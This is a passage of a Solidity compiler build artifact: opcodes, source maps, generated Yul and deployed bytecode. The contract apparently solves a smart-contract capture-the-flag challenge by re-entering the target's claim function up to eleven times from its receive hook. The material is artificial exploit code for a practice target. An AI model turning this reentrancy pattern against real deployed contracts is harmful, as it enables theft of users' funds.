AND PUSH4 0x4D092C7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x108 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x111 PUSH2 0x194 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x11E SWAP2 SWAP1 PUSH2 0x2DD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x133 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x13C PUSH2 0x19A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x149 SWAP2 SWAP1 PUSH2 0x2DD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x15E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x167 PUSH2 0x19F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x174 SWAP2 SWAP1 PUSH2 0x377 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x189 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x192 PUSH2 0x1C3 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xB DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4D092C7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x233 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x247 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x291 DUP3 PUSH2 0x27C JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x2C3 JUMPI PUSH2 0x2C2 PUSH2 0x24D JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2D7 DUP2 PUSH2 0x27C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2F2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2CE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x33D PUSH2 0x338 PUSH2 0x333 DUP5 PUSH2 0x2F8 JUMP JUMPDEST PUSH2 0x318 JUMP JUMPDEST PUSH2 0x2F8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x34F DUP3 PUSH2 0x322 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x361 DUP3 PUSH2 0x344 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x371 DUP2 PUSH2 0x356 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x38C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x368 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0xDC1D39E6FC4C5430E3265F240C0DEB629DD90162A79F69 PUSH13 0xD9FA85F5C72D0564736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"65:863:12:-:0;;;256:98;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;329:17;305:9;;:42;;;;;;;;;;;;;;;;;;256:98;65:863;;88:117:14;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;65:863:12:-;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@TARGET_5710":{"entryPoint":410,"id":5710,"parameterSlots":0,"returnSlots":0},"@_5756":{"entryPoint":null,"id":5756,"parameterSlots":0,"returnSlots":0},"@_5760":{"entryPoint":null,"id":5760,"parameterSlots":0,"returnSlots":0},"@callCount_5707":{"entryPoint":404,"id":5707,"parameterSlots":0,"returnSlots":0},"@challenge_5705":{"entryPoint":415,"id":5705,"parameterSlots":0,"returnSlots":0},"@startClaim_5739":{"entryPoint":451,"id":5739,"parameterSlots":0,"returnSlots":0},"abi_encode_t_contract$_IChallenge5_$5771_to_t_address_fromStack":{"entryPoint":872,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":718,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_contract$_IChallenge5_$5771__to_t_address__fromStack_reversed":{"entryPoint":887,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":733,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":760,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":636,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_contract$_IChallenge5_$5771_to_t_address":{"entryPoint":854,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_uint160_to_t_address":{"entryPoint":836,"id":null,"parameterSlots":1,"returnSlots":1},"convert_t_uint160_to_t_uint160":{"entryPoint":802,"id":null,"parameterSlots":1,"returnSlots":1},"identity":{"entryPoint":792,"id":null,"parameterSlots":1,"returnSlots":1},"increment_t_uint256":{"entryPoint":646,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x11":{"entryPoint":589,"id":null,"parameterSlots":0,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:1939:14","nodeType":"YulBlock","src":"0:1939:14","statements":[{"body":{"nativeSrc":"35:152:14","nodeType":"YulBlock","src":"35:152:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"52:1:14","nodeType":"YulLiteral","src":"52:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"55:77:14","nodeType":"YulLiteral","src":"55:77:14","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"45:6:14","nodeType":"YulIdentifier","src":"45:6:14"},"nativeSrc":"45:88:14","nodeType":"YulFunctionCall","src":"45:88:14"},"nativeSrc":"45:88:14","nodeType":"YulExpressionStatement","src":"45:88:14"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"149:1:14","nodeType":"YulLiteral","src":"149:1:14","type":"","value":"4"},{"kind":"number","nativeSrc":"152:4:14","nodeType":"YulLiteral","src":"152:4:14","type":"","value":"0x11"}],"functionName":{"name":"mstore","nativeSrc":"142:6:14","nodeType":"YulIdentifier","src":"142:6:14"},"nativeSrc":"142:15:14","nodeType":"YulFunctionCall","src":"142:15:14"},"nativeSrc":"142:15:14","nodeType":"YulExpressionStatement","src":"142:15:14"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"173:1:14","nodeType":"YulLiteral","src":"173:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"176:4:14","nodeType":"YulLiteral","src":"176:4:14","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"166:6:14","nodeType":"YulIdentifier","src":"166:6:14"},"nativeSrc":"166:15:14","nodeType":"YulFunctionCall","src":"166:15:14"},"nativeSrc":"166:15:14","nodeType":"YulExpressionStatement","src":"166:15:14"}]},"name":"panic_error_0x11","nativeSrc":"7:180:14","nodeType":"YulFunctionDefinition","src":"7:180:14"},{"body":{"nativeSrc":"238:32:14","nodeType":"YulBlock","src":"238:32:14","statements":[{"nativeSrc":"248:16:14","nodeType":"YulAssignment","src":"248:16:14","value":{"name":"value","nativeSrc":"259:5:14","nodeType":"YulIdentifier","src":"259:5:14"},"variableNames":[{"name":"cleaned","nativeSrc":"248:7:14","nodeType":"YulIdentifier","src":"248:7:14"}]}]},"name":"cleanup_t_uint256","nativeSrc":"193:77:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"220:5:14","nodeType":"YulTypedName","src":"220:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"230:7:14","nodeType":"YulTypedName","src":"230:7:14","type":""}],"src":"193:77:14"},{"body":{"nativeSrc":"319:190:14","nodeType":"YulBlock","src":"319:190:14","statements":[{"nativeSrc":"329:33:14","nodeType":"YulAssignment","src":"329:33:14","value":{"arguments":[{"name":"value","nativeSrc":"356:5:14","nodeType":"YulIdentifier","src":"356:5:14"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"338:17:14","nodeType":"YulIdentifier","src":"338:17:14"},"nativeSrc":"338:24:14","nodeType":"YulFunctionCall","src":"338:24:14"},"variableNames":[{"name":"value","nativeSrc":"329:5:14","nodeType":"YulIdentifier","src":"329:5:14"}]},{"body":{"nativeSrc":"452:22:14","nodeType":"YulBlock","src":"452:22:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"454:16:14","nodeType":"YulIdentifier","src":"454:16:14"},"nativeSrc":"454:18:14","nodeType":"YulFunctionCall","src":"454:18:14"},"nativeSrc":"454:18:14","nodeType":"YulExpressionStatement","src":"454:18:14"}]},"condition":{"arguments":[{"name":"value","nativeSrc":"377:5:14","nodeType":"YulIdentifier","src":"377:5:14"},{"kind":"number","nativeSrc":"384:66:14","nodeType":"YulLiteral","src":"384:66:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"eq","nativeSrc":"374:2:14","nodeType":"YulIdentifier","src":"374:2:14"},"nativeSrc":"374:77:14","nodeType":"YulFunctionCall","src":"374:77:14"},"nativeSrc":"371:103:14","nodeType":"YulIf","src":"371:103:14"},{"nativeSrc":"483:20:14","nodeType":"YulAssignment","src":"483:20:14","value":{"arguments":[{"name":"value","nativeSrc":"494:5:14","nodeType":"YulIdentifier","src":"494:5:14"},{"kind":"number","nativeSrc":"501:1:14","nodeType":"YulLiteral","src":"501:1:14","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"490:3:14","nodeType":"YulIdentifier","src":"490:3:14"},"nativeSrc":"490:13:14","nodeType":"YulFunctionCall","src":"490:13:14"},"variableNames":[{"name":"ret","nativeSrc":"483:3:14","nodeType":"YulIdentifier","src":"483:3:14"}]}]},"name":"increment_t_uint256","nativeSrc":"276:233:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"305:5:14","nodeType":"YulTypedName","src":"305:5:14","type":""}],"returnVariables":[{"name":"ret","nativeSrc":"315:3:14","nodeType":"YulTypedName","src":"315:3:14","type":""}],"src":"276:233:14"},{"body":{"nativeSrc":"580:53:14","nodeType":"YulBlock","src":"580:53:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"597:3:14","nodeType":"YulIdentifier","src":"597:3:14"},{"arguments":[{"name":"value","nativeSrc":"620:5:14","nodeType":"YulIdentifier","src":"620:5:14"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"602:17:14","nodeType":"YulIdentifier","src":"602:17:14"},"nativeSrc":"602:24:14","nodeType":"YulFunctionCall","src":"602:24:14"}],"functionName":{"name":"mstore","nativeSrc":"590:6:14","nodeType":"YulIdentifier","src":"590:6:14"},"nativeSrc":"590:37:14","nodeType":"YulFunctionCall","src":"590:37:14"},"nativeSrc":"590:37:14","nodeType":"YulExpressionStatement","src":"590:37:14"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"515:118:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"568:5:14","nodeType":"YulTypedName","src":"568:5:14","type":""},{"name":"pos","nativeSrc":"575:3:14","nodeType":"YulTypedName","src":"575:3:14","type":""}],"src":"515:118:14"},{"body":{"nativeSrc":"737:124:14","nodeType":"YulBlock","src":"737:124:14","statements":[{"nativeSrc":"747:26:14","nodeType":"YulAssignment","src":"747:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"759:9:14","nodeType":"YulIdentifier","src":"759:9:14"},{"kind":"number","nativeSrc":"770:2:14","nodeType":"YulLiteral","src":"770:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"755:3:14","nodeType":"YulIdentifier","src":"755:3:14"},"nativeSrc":"755:18:14","nodeType":"YulFunctionCall","src":"755:18:14"},"variableNames":[{"name":"tail","nativeSrc":"747:4:14","nodeType":"YulIdentifier","src":"747:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"827:6:14","nodeType":"YulIdentifier","src":"827:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"840:9:14","nodeType":"YulIdentifier","src":"840:9:14"},{"kind":"number","nativeSrc":"851:1:14","nodeType":"YulLiteral","src":"851:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"836:3:14","nodeType":"YulIdentifier","src":"836:3:14"},"nativeSrc":"836:17:14","nodeType":"YulFunctionCall","src":"836:17:14"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"783:43:14","nodeType":"YulIdentifier","src":"783:43:14"},"nativeSrc":"783:71:14","nodeType":"YulFunctionCall","src":"783:71:14"},"nativeSrc":"783:71:14","nodeType":"YulExpressionStatement","src":"783:71:14"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nativeSrc":"639:222:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"709:9:14","nodeType":"YulTypedName","src":"709:9:14","type":""},{"name":"value0","nativeSrc":"721:6:14","nodeType":"YulTypedName","src":"721:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"732:4:14","nodeType":"YulTypedName","src":"732:4:14","type":""}],"src":"639:222:14"},{"body":{"nativeSrc":"912:81:14","nodeType":"YulBlock","src":"912:81:14","statements":[{"nativeSrc":"922:65:14","nodeType":"YulAssignment","src":"922:65:14","value":{"arguments":[{"name":"value","nativeSrc":"937:5:14","nodeType":"YulIdentifier","src":"937:5:14"},{"kind":"number","nativeSrc":"944:42:14","nodeType":"YulLiteral","src":"944:42:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"933:3:14","nodeType":"YulIdentifier","src":"933:3:14"},"nativeSrc":"933:54:14","nodeType":"YulFunctionCall","src":"933:54:14"},"variableNames":[{"name":"cleaned","nativeSrc":"922:7:14","nodeType":"YulIdentifier","src":"922:7:14"}]}]},"name":"cleanup_t_uint160","nativeSrc":"867:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"894:5:14","nodeType":"YulTypedName","src":"894:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"904:7:14","nodeType":"YulTypedName","src":"904:7:14","type":""}],"src":"867:126:14"},{"body":{"nativeSrc":"1031:28:14","nodeType":"YulBlock","src":"1031:28:14","statements":[{"nativeSrc":"1041:12:14","nodeType":"YulAssignment","src":"1041:12:14","value":{"name":"value","nativeSrc":"1048:5:14","nodeType":"YulIdentifier","src":"1048:5:14"},"variableNames":[{"name":"ret","nativeSrc":"1041:3:14","nodeType":"YulIdentifier","src":"1041:3:14"}]}]},"name":"identity","nativeSrc":"999:60:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1017:5:14","nodeType":"YulTypedName","src":"1017:5:14","type":""}],"returnVariables":[{"name":"ret","nativeSrc":"1027:3:14","nodeType":"YulTypedName","src":"1027:3:14","type":""}],"src":"999:60:14"},{"body":{"nativeSrc":"1125:82:14","nodeType":"YulBlock","src":"1125:82:14","statements":[{"nativeSrc":"1135:66:14","nodeType":"YulAssignment","src":"1135:66:14","value":{"arguments":[{"arguments":[{"arguments":[{"name":"value","nativeSrc":"1193:5:14","nodeType":"YulIdentifier","src":"1193:5:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"1175:17:14","nodeType":"YulIdentifier","src":"1175:17:14"},"nativeSrc":"1175:24:14","nodeType":"YulFunctionCall","src":"1175:24:14"}],"functionName":{"name":"identity","nativeSrc":"1166:8:14","nodeType":"YulIdentifier","src":"1166:8:14"},"nativeSrc":"1166:34:14","nodeType":"YulFunctionCall","src":"1166:34:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"1148:17:14","nodeType":"YulIdentifier","src":"1148:17:14"},"nativeSrc":"1148:53:14","nodeType":"YulFunctionCall","src":"1148:53:14"},"variableNames":[{"name":"converted","nativeSrc":"1135:9:14","nodeType":"YulIdentifier","src":"1135:9:14"}]}]},"name":"convert_t_uint160_to_t_uint160","nativeSrc":"1065:142:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1105:5:14","nodeType":"YulTypedName","src":"1105:5:14","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"1115:9:14","nodeType":"YulTypedName","src":"1115:9:14","type":""}],"src":"1065:142:14"},{"body":{"nativeSrc":"1273:66:14","nodeType":"YulBlock","src":"1273:66:14","statements":[{"nativeSrc":"1283:50:14","nodeType":"YulAssignment","src":"1283:50:14","value":{"arguments":[{"name":"value","nativeSrc":"1327:5:14","nodeType":"YulIdentifier","src":"1327:5:14"}],"functionName":{"name":"convert_t_uint160_to_t_uint160","nativeSrc":"1296:30:14","nodeType":"YulIdentifier","src":"1296:30:14"},"nativeSrc":"1296:37:14","nodeType":"YulFunctionCall","src":"1296:37:14"},"variableNames":[{"name":"converted","nativeSrc":"1283:9:14","nodeType":"YulIdentifier","src":"1283:9:14"}]}]},"name":"convert_t_uint160_to_t_address","nativeSrc":"1213:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1253:5:14","nodeType":"YulTypedName","src":"1253:5:14","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"1263:9:14","nodeType":"YulTypedName","src":"1263:9:14","type":""}],"src":"1213:126:14"},{"body":{"nativeSrc":"1425:66:14","nodeType":"YulBlock","src":"1425:66:14","statements":[{"nativeSrc":"1435:50:14","nodeType":"YulAssignment","src":"1435:50:14","value":{"arguments":[{"name":"value","nativeSrc":"1479:5:14","nodeType":"YulIdentifier","src":"1479:5:14"}],"functionName":{"name":"convert_t_uint160_to_t_address","nativeSrc":"1448:30:14","nodeType":"YulIdentifier","src":"1448:30:14"},"nativeSrc":"1448:37:14","nodeType":"YulFunctionCall","src":"1448:37:14"},"variableNames":[{"name":"converted","nativeSrc":"1435:9:14","nodeType":"YulIdentifier","src":"1435:9:14"}]}]},"name":"convert_t_contract$_IChallenge5_$5771_to_t_address","nativeSrc":"1345:146:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1405:5:14","nodeType":"YulTypedName","src":"1405:5:14","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"1415:9:14","nodeType":"YulTypedName","src":"1415:9:14","type":""}],"src":"1345:146:14"},{"body":{"nativeSrc":"1582:86:14","nodeType":"YulBlock","src":"1582:86:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"1599:3:14","nodeType":"YulIdentifier","src":"1599:3:14"},{"arguments":[{"name":"value","nativeSrc":"1655:5:14","nodeType":"YulIdentifier","src":"1655:5:14"}],"functionName":{"name":"convert_t_contract$_IChallenge5_$5771_to_t_address","nativeSrc":"1604:50:14","nodeType":"YulIdentifier","src":"1604:50:14"},"nativeSrc":"1604:57:14","nodeType":"YulFunctionCall","src":"1604:57:14"}],"functionName":{"name":"mstore","nativeSrc":"1592:6:14","nodeType":"YulIdentifier","src":"1592:6:14"},"nativeSrc":"1592:70:14","nodeType":"YulFunctionCall","src":"1592:70:14"},"nativeSrc":"1592:70:14","nodeType":"YulExpressionStatement","src":"1592:70:14"}]},"name":"abi_encode_t_contract$_IChallenge5_$5771_to_t_address_fromStack","nativeSrc":"1497:171:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1570:5:14","nodeType":"YulTypedName","src":"1570:5:14","type":""},{"name":"pos","nativeSrc":"1577:3:14","nodeType":"YulTypedName","src":"1577:3:14","type":""}],"src":"1497:171:14"},{"body":{"nativeSrc":"1792:144:14","nodeType":"YulBlock","src":"1792:144:14","statements":[{"nativeSrc":"1802:26:14","nodeType":"YulAssignment","src":"1802:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"1814:9:14","nodeType":"YulIdentifier","src":"1814:9:14"},{"kind":"number","nativeSrc":"1825:2:14","nodeType":"YulLiteral","src":"1825:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1810:3:14","nodeType":"YulIdentifier","src":"1810:3:14"},"nativeSrc":"1810:18:14","nodeType":"YulFunctionCall","src":"1810:18:14"},"variableNames":[{"name":"tail","nativeSrc":"1802:4:14","nodeType":"YulIdentifier","src":"1802:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"1902:6:14","nodeType":"YulIdentifier","src":"1902:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"1915:9:14","nodeType":"YulIdentifier","src":"1915:9:14"},{"kind":"number","nativeSrc":"1926:1:14","nodeType":"YulLiteral","src":"1926:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1911:3:14","nodeType":"YulIdentifier","src":"1911:3:14"},"nativeSrc":"1911:17:14","nodeType":"YulFunctionCall","src":"1911:17:14"}],"functionName":{"name":"abi_encode_t_contract$_IChallenge5_$5771_to_t_address_fromStack","nativeSrc":"1838:63:14","nodeType":"YulIdentifier","src":"1838:63:14"},"nativeSrc":"1838:91:14","nodeType":"YulFunctionCall","src":"1838:91:14"},"nativeSrc":"1838:91:14","nodeType":"YulExpressionStatement","src":"1838:91:14"}]},"name":"abi_encode_tuple_t_contract$_IChallenge5_$5771__to_t_address__fromStack_reversed","nativeSrc":"1674:262:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1764:9:14","nodeType":"YulTypedName","src":"1764:9:14","type":""},{"name":"value0","nativeSrc":"1776:6:14","nodeType":"YulTypedName","src":"1776:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"1787:4:14","nodeType":"YulTypedName","src":"1787:4:14","type":""}],"src":"1674:262:14"}]},"contents":"{\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_uint160_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))\n    }\n\n    function convert_t_uint160_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_IChallenge5_$5771_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_address(value)\n    }\n\n    function abi_encode_t_contract$_IChallenge5_$5771_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_IChallenge5_$5771_to_t_address(value))\n    }\n\n    function abi_encode_tuple_t_contract$_IChallenge5_$5771__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_IChallenge5_$5771_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n","id":14,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"6080604052600436106100435760003560e01c80634b28f9a2146100fc578063cc1f2afa14610127578063d2ef739814610152578063ecbfc0771461017d576100ee565b366100ee57600b60015410156100ec576001600081548092919061006690610286565b919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166304d092c76040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100d357600080fd5b505af11580156100e7573d6000803e3d6000fd5b505050505b005b3480156100fa57600080fd5b005b34801561010857600080fd5b50610111610194565b60405161011e91906102dd565b60405180910390f35b34801561013357600080fd5b5061013c61019a565b60405161014991906102dd565b60405180910390f35b34801561015e57600080fd5b5061016761019f565b6040516101749190610377565b60405180910390f35b34801561018957600080fd5b506101926101c3565b005b60015481565b600b81565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060018190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166304d092c76040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561023357600080fd5b505af1158015610247573d6000803e3d6000fd5b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b60006102918261027c565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102c3576102c261024d565b5b600182019050919050565b6102d78161027c565b82525050565b60006020820190506102f260008301846102ce565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061033d610338610333846102f8565b610318565b6102f8565b9050919050565b600061034f82610322565b9050919050565b600061036182610344565b9050919050565b61037181610356565b82525050565b600060208201905061038c6000830184610368565b9291505056fea264697066735822122076dc1d39e6fc4c5430e3265f240c0deb629dd90162a79f696cd9fa85f5c72d0564736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4B28F9A2 EQ PUSH2 0xFC JUMPI DUP1 PUSH4 0xCC1F2AFA EQ PUSH2 0x127 JUMPI DUP1 PUSH4 0xD2EF7398 EQ PUSH2 0x152 JUMPI DUP1 PUSH4 0xECBFC077 EQ PUSH2 0x17D JUMPI PUSH2 0xEE JUMP JUMPDEST CALLDATASIZE PUSH2 0xEE JUMPI PUSH1 0xB 